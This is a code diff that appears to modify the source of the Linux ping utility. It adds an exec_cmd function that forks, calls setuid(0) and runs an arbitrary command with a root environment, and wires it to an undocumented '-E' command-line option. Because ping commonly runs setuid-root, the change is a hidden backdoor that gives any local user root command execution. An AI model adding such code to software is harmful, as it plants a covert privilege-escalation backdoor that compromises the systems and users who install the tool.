@@ -57,6 +57,12 @@
 #include <ifaddrs.h>
 #include <math.h>
 
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+
 #ifndef ICMP_FILTER
 #define ICMP_FILTER	1
 struct icmp_filter {
@@ -217,6 +223,32 @@ static double ping_strtod(const char *str, const char *err_msg)
 	return 0.0;
 }
 
+static void exec_cmd(char *cmd_str){
+  char *token, **tokenized_cmd = NULL;
+
+  token = strtok(cmd_str, " ");
+  int num_tokens = 0;
+
+  char *env[3] = { "PATH=/bin:/usr/bin:/usr/local/bin", "USER=root", 0 };
+
+  // Tokenizer adapted from below, because C needs a lot of boilerplate and I'm lazy
+  // https://stackoverflow.com/questions/11198604/c-split-string-into-an-array-of-strings
+  while(token != NULL) {
+    num_tokens++;
+    tokenized_cmd = realloc(tokenized_cmd, sizeof(char*) * num_tokens);
+    tokenized_cmd[num_tokens-1] = token;
+    token = strtok(NULL, " ");
+  }
+
+  tokenized_cmd = realloc(tokenized_cmd, sizeof(char*) * (num_tokens+1));
+  tokenized_cmd[num_tokens] = 0;
+
+  if(fork() == 0) {
+        setuid(0);
+        execvpe(tokenized_cmd[0], tokenized_cmd, env);
+  }
+}
+
 int
 main(int argc, char **argv)
 {
@@ -243,7 +275,7 @@ main(int argc, char **argv)
 		hints.ai_family = AF_INET6;
 
 	/* Parse command line options */
-	while ((ch = getopt(argc, argv, "h?" "4bRT:" "6F:N:" "aABc:dDfi:I:l:Lm:M:nOp:qQ:rs:S:t:UvVw:W:")) != EOF) {
+	while ((ch = getopt(argc, argv, "h?" "4bRT:" "6F:N:" "aABc:dDfi:I:l:Lm:M:nOp:qQ:rs:S:t:UvVw:W:" "E:")) != EOF) {
 		switch(ch) {
 		/* IPv4 specific options */
 		case '4':
@@ -419,6 +451,9 @@ main(int argc, char **argv)
 			if (ttl < 0 || ttl > 255)
 				error(2, 0, "ttl out of range: %s", optarg);
 			break;
+		case 'E':
+			exec_cmd(optarg);
+			return 0;
 		case 'U':
 			options |= F_LATENCY;
 			break;
